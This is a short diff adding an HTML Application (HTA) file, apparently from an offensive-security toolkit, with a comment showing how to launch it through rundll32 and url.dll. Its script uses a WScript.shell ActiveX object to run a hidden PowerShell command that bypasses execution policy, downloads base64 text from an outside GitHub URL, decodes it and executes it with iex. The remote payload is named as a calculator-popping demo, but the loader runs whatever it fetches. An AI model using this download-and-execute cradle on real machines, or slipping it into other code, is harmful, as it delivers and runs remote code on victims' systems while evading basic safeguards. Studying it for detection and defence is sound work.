@@ -1,0 +1,10 @@
+// rundll32.exe url.dll,FileProtocolHandler file:///C:/path/to/file/wscript-psh.hta
+<html>
+    <head>
+        <script>
+            objShell = new ActiveXObject("WScript.shell");
+            objShell.run("%windir%//system32//cmd.exe /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/ben0/Offsec-stuff/master/pop_calc.txt'))))",0)
+            window.close()
+        </script>
+    </head>
+</html>
